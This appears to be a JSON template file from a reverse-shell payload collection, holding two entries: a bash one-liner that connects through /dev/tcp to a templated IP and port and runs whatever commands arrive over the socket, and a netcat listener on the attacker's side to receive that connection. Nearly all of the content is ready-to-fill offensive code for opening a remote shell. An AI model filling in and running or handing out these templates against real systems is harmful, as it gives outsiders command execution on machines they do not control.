{
  "commands": [
    {
      "title": "bash readline (loop/read)",
      "template": "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
      "description": "Reads commands from the socket and executes them, sending stdout/stderr back."
    },
    {
      "title": "Netcat Listener",
      "template": "nc -lvnp {port}"
    }
  ]
}
